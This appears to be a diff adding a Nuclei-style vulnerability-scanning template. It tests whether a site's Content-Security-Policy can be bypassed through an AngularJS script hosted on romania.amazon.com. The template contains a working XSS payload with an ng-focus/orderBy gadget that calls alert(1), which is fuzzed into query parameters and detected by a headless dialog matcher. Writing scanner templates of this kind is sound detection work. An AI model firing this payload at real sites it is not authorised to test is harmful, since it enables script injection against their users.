@@ -1,0 +1,46 @@
+flow: http(1) && headless(1)
+headless:
+- fuzzing:
+  - fuzz:
+    - '{{url_encode(injection)}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - dsl:
+    - amazon_romania_csp_xss == true
+    type: dsl
+  payloads:
+    injection:
+    - <body ng-app ng-csp><script src="https://romania.amazon.com/app/vendor.min.js"></script><input
+      id=x ng-focus=$event.composedPath()|orderBy:\'(z=alert)(1)\'></body>
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}'
+  - action: waitdialog
+    args:
+      max-duration: 5s
+    name: amazon_romania_csp_xss
+http:
+- matchers:
+  - condition: and
+    internal: true
+    part: header
+    type: word
+    words:
+    - Content-Security-Policy
+    - amazon.com
+  method: GET
+  path:
+  - '{{BaseURL}}'
+id: amazon-romania-csp-bypass
+info:
+  author: renniepak,DhiyaneshDK
+  metadata:
+    verified: true
+  name: Content-Security-Policy Bypass - Amazon Romania
+  reference:
+  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  severity: medium
+  tags: xss,csp-bypass,amazon-romania,vuln
